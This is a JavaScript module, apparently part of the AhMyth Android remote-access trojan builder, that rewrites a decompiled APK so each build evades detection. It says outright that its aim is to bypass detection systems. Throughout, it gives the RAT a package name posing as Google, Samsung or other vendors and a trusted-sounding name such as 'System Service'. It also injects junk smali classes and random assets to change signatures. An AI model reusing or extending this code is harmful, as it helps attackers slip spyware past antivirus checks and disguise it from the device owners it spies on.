/**
 * APK Obfuscator Module
 * Makes each build unique to bypass detection systems
 */

const fs = require('fs-extra');
const path = require('path');
const crypto = require('crypto');

// Random name generators
const adjectives = ['Quick', 'Silent', 'Dark', 'Swift', 'Smart', 'Bright', 'Cool', 'Fast', 'Safe', 'Pure', 'Clean', 'Fresh', 'Active', 'Prime', 'Ultra', 'Super', 'Mega', 'Pro', 'Plus', 'Max'];
const nouns = ['Service', 'Helper', 'Manager', 'Handler', 'Worker', 'Agent', 'Module', 'Core', 'Engine', 'System', 'Guard', 'Shield', 'Sync', 'Connect', 'Link', 'Hub', 'Base', 'Node', 'Unit', 'Task'];
const prefixes = ['com', 'org', 'net', 'io', 'app', 'dev', 'tech', 'mobile', 'android', 'system'];
const companies = ['google', 'samsung', 'huawei', 'xiaomi', 'oppo', 'vivo', 'oneplus', 'realme', 'motorola', 'nokia', 'sony', 'lg', 'asus', 'lenovo', 'htc'];

class APKObfuscator {
    constructor() {
        this.seed = Date.now().toString(36) + Math.random().toString(36).substr(2);
        this.stringMap = new Map();
        this.classMap = new Map();
    }

    /**
     * Generate a random hash
     */
    randomHash(length = 8) {
        return crypto.randomBytes(length).toString('hex').substr(0, length);
    }

    /**
     * Generate a random package name that looks legitimate
     */
    generatePackageName() {
        const prefix = prefixes[Math.floor(Math.random() * prefixes.length)];
        const company = companies[Math.floor(Math.random() * companies.length)];
        const suffix = ['service', 'helper', 'manager', 'system', 'core', 'sync', 'backup', 'security', 'optimizer', 'cleaner'][Math.floor(Math.random() * 10)];
        return `${prefix}.${company}.${suffix}`;
    }

    /**
     * Generate a random app name
     */
    generateAppName() {
        const templates = [
            () => `${adjectives[Math.floor(Math.random() * adjectives.length)]} ${nouns[Math.floor(Math.random() * nouns.length)]}`,
            () => `System ${nouns[Math.floor(Math.random() * nouns.length)]}`,
            () => `${companies[Math.floor(Math.random() * companies.length)].charAt(0).toUpperCase() + companies[Math.floor(Math.random() * companies.length)].slice(1)} Services`,
            () => `Android ${nouns[Math.floor(Math.random() * nouns.length)]}`,
            () => `Device ${nouns[Math.floor(Math.random() * nouns.length)]}`,
            () => `Background ${nouns[Math.floor(Math.random() * nouns.length)]}`,
        ];
        return templates[Math.floor(Math.random() * templates.length)]();
    }

    /**
     * Generate random class name
     */
    generateClassName() {
        const adj = adjectives[Math.floor(Math.random() * adjectives.length)];
        const noun = nouns[Math.floor(Math.random() * nouns.length)];
        return adj + noun + this.randomHash(4);
    }

    /**
     * Generate junk code (smali)
     */
    generateJunkSmaliMethod() {
        const methodName = 'j' + this.randomHash(6);
        const varCount = Math.floor(Math.random() * 3) + 1;
        let code = `.method private static ${methodName}()V\n`;
        code += `    .locals ${varCount}\n`;
        code += `    \n`;
        
        // Add some random operations
        for (let i = 0; i < varCount; i++) {
            const val = Math.floor(Math.random() * 1000);
            code += `    const/16 v${i}, 0x${val.toString(16)}\n`;
        }
        
        // Add some random math
        if (varCount > 1) {
            code += `    add-int v0, v0, v1\n`;
            code += `    mul-int v0, v0, v0\n`;
        }
        
        code += `    return-void\n`;
        code += `.end method\n`;
        
        return code;
    }

    /**
     * Generate junk smali class
     */
    generateJunkSmaliClass(packagePath) {
        const className = 'J' + this.randomHash(8);
        let code = `.class public L${packagePath}/${className};\n`;
        code += `.super Ljava/lang/Object;\n\n`;
        
        // Add some junk fields
        const fieldCount = Math.floor(Math.random() * 5) + 1;
        for (let i = 0; i < fieldCount; i++) {
            const fieldName = 'f' + this.randomHash(4);
            const types = ['I', 'Z', 'J', 'Ljava/lang/String;'];
            const type = types[Math.floor(Math.random() * types.length)];
            code += `.field private static ${fieldName}:${type}\n`;
        }
        code += '\n';
        
        // Add junk methods
        const methodCount = Math.floor(Math.random() * 3) + 1;
        for (let i = 0; i < methodCount; i++) {
            code += this.generateJunkSmaliMethod();
            code += '\n';
        }
        
        return { name: className + '.smali', content: code };
    }

    /**
     * Encrypt/encode a string
     */
    encodeString(str) {
        // Simple XOR with random key
        const key = Math.floor(Math.random() * 255) + 1;
        let encoded = [];
        for (let i = 0; i < str.length; i++) {
            encoded.push(str.charCodeAt(i) ^ key);
        }
        return { encoded, key };
    }

    /**
     * Modify AndroidManifest.xml for obfuscation
     */
    async obfuscateManifest(manifestPath, options) {
        let manifest = await fs.readFile(manifestPath, 'utf8');
        
        if (options.randomizePackage && options.newPackageName) {
            // Replace package name throughout manifest
            manifest = manifest.replace(/ahmyth\.mine\.king\.ahmyth/g, options.newPackageName);
        }
        
        if (options.randomizeAppName && options.newAppName) {
            // This would need to modify strings.xml as well
        }
        
        // Add random version code
        if (options.randomizeVersion) {
            const versionCode = Math.floor(Math.random() * 100) + 1;
            manifest = manifest.replace(/android:versionCode="[^"]*"/, `android:versionCode="${versionCode}"`);
            
            const versionName = `${Math.floor(Math.random() * 5) + 1}.${Math.floor(Math.random() * 10)}.${Math.floor(Math.random() * 100)}`;
            manifest = manifest.replace(/android:versionName="[^"]*"/, `android:versionName="${versionName}"`);
        }
        
        await fs.writeFile(manifestPath, manifest);
        return manifest;
    }

    /**
     * Inject junk classes into smali
     */
    async injectJunkClasses(smaliDir, count = 5) {
        const junkDir = path.join(smaliDir, 'junk');
        await fs.ensureDir(junkDir);
        
        const injected = [];
        for (let i = 0; i < count; i++) {
            const junkClass = this.generateJunkSmaliClass('junk');
            const filePath = path.join(junkDir, junkClass.name);
            await fs.writeFile(filePath, junkClass.content);
            injected.push(junkClass.name);
        }
        
        return injected;
    }

    /**
     * Add random metadata to APK
     */
    async addRandomMetadata(apkDir) {
        const assetsDir = path.join(apkDir, 'assets');
        await fs.ensureDir(assetsDir);
        
        // Add random config files
        const configFiles = [
            { name: 'config.dat', content: crypto.randomBytes(64).toString('base64') },
            { name: '.metadata', content: JSON.stringify({ v: this.randomHash(16), t: Date.now() }) },
            { name: 'cache.bin', content: crypto.randomBytes(128) },
        ];
        
        for (const file of configFiles) {
            await fs.writeFile(path.join(assetsDir, file.name), file.content);
        }
        
        return configFiles.map(f => f.name);
    }

    /**
     * Modify resource IDs to be random
     */
    async randomizeResources(resDir) {
        // Add random drawable
        const drawablesDir = path.join(resDir, 'drawable');
        if (await fs.pathExists(drawablesDir)) {
            // Create a tiny random PNG (1x1 pixel)
            const randomName = 'ic_' + this.randomHash(8);
            // Just create an empty placeholder for now
        }
    }

    /**
     * Main obfuscation function
     */
    async obfuscate(apkDir, options = {}) {
        const results = {
            success: true,
            changes: [],
            newPackageName: null,
            newAppName: null
        };

        try {
            // Generate new identifiers if requested
            if (options.randomizePackage) {
                results.newPackageName = options.customPackage || this.generatePackageName();
            }
            
            if (options.randomizeAppName) {
                results.newAppName = options.customAppName || this.generateAppName();
            }

            // 1. Obfuscate manifest
            if (options.randomizePackage || options.randomizeVersion) {
                const manifestPath = path.join(apkDir, 'AndroidManifest.xml');
                if (await fs.pathExists(manifestPath)) {
                    await this.obfuscateManifest(manifestPath, {
                        ...options,
                        newPackageName: results.newPackageName,
                        newAppName: results.newAppName
                    });
                    results.changes.push('Manifest obfuscated');
                }
            }

            // 2. Inject junk classes
            if (options.injectJunk) {
                const smaliDirs = ['smali', 'smali_classes2', 'smali_classes3'];
                for (const dir of smaliDirs) {
                    const smaliPath = path.join(apkDir, dir);
                    if (await fs.pathExists(smaliPath)) {
                        const injected = await this.injectJunkClasses(smaliPath, options.junkCount || 5);
                        results.changes.push(`Injected ${injected.length} junk classes to ${dir}`);
                        break; // Only inject to first smali dir
                    }
                }
            }

            // 3. Add random metadata
            if (options.addMetadata) {
                const metadata = await this.addRandomMetadata(apkDir);
                results.changes.push(`Added ${metadata.length} metadata files`);
            }

            // 4. Modify strings.xml
            if (options.randomizeAppName && results.newAppName) {
                const stringsPath = path.join(apkDir, 'res', 'values', 'strings.xml');
                if (await fs.pathExists(stringsPath)) {
                    let strings = await fs.readFile(stringsPath, 'utf8');
                    strings = strings.replace(/<string name="app_name">[^<]*<\/string>/, 
                        `<string name="app_name">${results.newAppName}</string>`);
                    await fs.writeFile(stringsPath, strings);
                    results.changes.push(`App name changed to: ${results.newAppName}`);
                }
            }

            // 5. Add build timestamp
            const buildInfo = {
                buildId: this.randomHash(32),
                timestamp: Date.now(),
                seed: this.seed
            };
            await fs.writeFile(
                path.join(apkDir, 'assets', 'build.json'),
                JSON.stringify(buildInfo)
            );
            results.changes.push('Build signature added');

        } catch (error) {
            results.success = false;
            results.error = error.message;
        }

        return results;
    }
}

module.exports = APKObfuscator;

